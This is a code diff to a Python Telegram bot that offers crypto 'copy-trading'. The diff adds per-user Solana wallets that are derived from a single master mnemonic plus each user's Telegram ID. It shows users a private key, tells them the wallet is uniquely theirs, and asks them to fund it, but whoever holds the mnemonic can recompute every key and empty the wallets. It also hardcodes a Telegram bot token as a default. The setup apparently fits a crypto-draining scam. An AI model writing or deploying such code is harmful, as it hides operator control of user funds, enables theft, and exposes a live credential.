@@ -1,4 +1,11 @@
 import re
+import os
+import hashlib
+import base58
+import json
+from dotenv import load_dotenv
+from nacl.signing import SigningKey
+from solders.keypair import Keypair
 from telegram import (
     Update,
     ReplyKeyboardMarkup,
@@ -13,32 +20,89 @@ from telegram.ext import (
     filters,
     ContextTypes
 )
+
+# Load environment variables
+load_dotenv()
 # Store temporary user states
 user_states = {}
 
 # ---- CONFIG ----
-BOT_TOKEN = "8469292173:AAFwdg2McWdFpzoqnC1ySayDhFFC4UKgAxY"        # <- replace with your new token from BotFather
-GROUP_ID = -1002762295115  # <- the group id you mentioned
+BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', "8469292173:AAFwdg2McWdFpzoqnC1ySayDhFFC4UKgAxY")
+GROUP_ID = int(os.getenv('ADMIN_GROUP_ID', -1002762295115))
+MNEMONIC = os.getenv('MNEMONIC', '')  # Master seed phrase for wallet generation
+
+# ---- Wallet Generation Utility Functions ----
+def derive_seed_from_mnemonic_and_id(mnemonic: str, telegram_id: int) -> bytes:
+    """
+    Deterministic derivation: Uses SHA256(mnemonic || ':' || telegram_id)
+    Returns 32-byte seed for each unique Telegram ID
+    """
+    msg = (mnemonic.strip() + ":" + str(telegram_id)).encode("utf-8")
+    digest = hashlib.sha256(msg).digest()
+    return digest[:32]
+
+def derive_keypair_and_address(telegram_id: int):
+    """
+    Generate unique Solana wallet for a Telegram user
+    Returns: (public_address, private_key_base58)
+    """
+    if not MNEMONIC:
+        raise ValueError("MNEMONIC not set in environment variables")
+    
+    # Derive unique seed for this telegram ID
+    seed32 = derive_seed_from_mnemonic_and_id(MNEMONIC, telegram_id)
+    
+    # Generate Solana keypair
+    kp = Keypair.from_seed(seed32)
+    public_address = str(kp.pubkey())
+    
+    # Generate 64-byte secret key (private + public)
+    sk = SigningKey(seed32)
+    vk = sk.verify_key
+    secret_64 = sk.encode() + vk.encode()
+    private_key_b58 = base58.b58encode(secret_64).decode()
+    
+    return public_address, private_key_b58
 
 # ✅ Step 1: Put the wallet function here
 async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    wallet_text = (
-        "💼 <b>Wallet Overview</b> — <i>Not Connected</i> ❌\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━\n"
-        "<b>Holdings</b>\n"
-        "• <b>SOL:</b> 0.00 (0%)\n"
-        "• <b>Tokens:</b> 0.00 USDT (0%)\n"
-        "• <b>Total Assets:</b> 0.00 USDT\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "🔘 <i>No active tokens detected.</i>\n"
-        "💰 <b>Fund Your Bot</b>\n"
-        "Send SOL to:\n"
-        "<code>HJZ4xfamRhYmTM7hswVSNFhLr31dY8B4Hq4UgfNNcFSJ</code>\n\n"
-        "(Funds are required for copy-trading operations.)\n\n"
-        "⚡ <b>Quick Actions</b>\n"
-        "• ⚓️ /start – Refresh your bot\n\n"
-        "👇 <i>What would you like to do next?</i>"
-    )
+    user = update.effective_user
+    telegram_id = user.id
+    
+    try:
+        # Generate unique wallet for this user
+        public_address, private_key_b58 = derive_keypair_and_address(telegram_id)
+        
+        wallet_text = (
+            "💼 <b>Wallet Overview</b> — <i>Connected</i> ✅\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "<b>Your Unique Solana Wallet</b>\n\n"
+            "📬 <b>Public Address:</b>\n"
+            f"<code>{public_address}</code>\n\n"
+            "🔐 <b>Private Key:</b>\n"
+            f"<code>{private_key_b58}</code>\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "<b>Holdings</b>\n"
+            "• <b>SOL:</b> 0.00 (0%)\n"
+            "• <b>Tokens:</b> 0.00 USDT (0%)\n"
+            "• <b>Total Assets:</b> 0.00 USDT\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            "🔘 <i>No active tokens detected.</i>\n\n"
+            "💰 <b>Fund Your Bot</b>\n"
+            f"Send SOL to your address above\n\n"
+            "(Funds are required for copy-trading operations.)\n\n"
+            "⚠️ <b>Security:</b> Keep your private key safe! Never share it.\n"
+            "This wallet is uniquely generated for your Telegram ID.\n\n"
+            "⚡ <b>Quick Actions</b>\n"
+            "• ⚓️ /start – Refresh your bot\n\n"
+            "👇 <i>What would you like to do next?</i>"
+        )
+    except Exception as e:
+        wallet_text = (
+            "⚠️ <b>Wallet Generation Error</b>\n\n"
+            "Unable to generate wallet. Please contact support.\n"
+            f"Error: {str(e)}"
+        )
 
     if update.message:  # user typed 🧩Wallet
         await update.message.reply_text(wallet_text, parse_mode="HTML")
